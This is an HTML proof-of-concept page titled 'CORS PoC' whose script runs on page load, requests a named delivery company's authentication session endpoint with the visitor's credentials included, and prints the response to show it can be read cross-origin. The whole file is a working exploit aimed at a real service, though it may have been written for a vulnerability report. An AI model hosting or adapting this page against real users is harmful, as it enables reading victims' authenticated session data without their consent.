<!doctype html>
<html>
    <body>
        <h1>CORS PoC</h1>
        <pre id="out">Waiting...</pre>

        <script>
            (async () => {
                try {
                    const res = await fetch(
                        "https://apis.consumers.dpd.co.uk/auth/session",
                        {
                            method: "GET",
                            credentials: "include",
                        },
                    );

                    document.getElementById("out").textContent =
                        "Status: " + res.status + "\n\n";

                    const text = await res.text();

                    document.getElementById("out").textContent +=
                        "Response readable:\n" + text;
                } catch (e) {
                    document.getElementById("out").textContent =
                        "Error: " + e.message;
                }
            })();
        </script>
    </body>
</html>
